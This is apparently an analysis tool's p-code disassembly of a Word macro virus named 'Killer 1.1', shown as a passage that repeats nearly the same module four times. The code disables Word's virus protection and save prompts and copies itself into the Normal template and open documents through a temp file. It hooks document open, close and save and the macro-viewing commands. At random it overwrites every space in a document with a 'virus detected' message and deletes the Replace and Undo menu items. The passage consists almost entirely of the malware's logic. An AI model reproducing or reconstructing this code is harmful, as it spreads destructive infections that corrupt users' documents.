' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer16 - 6179 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer17 - 5347 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer18 - 5347 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer19 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
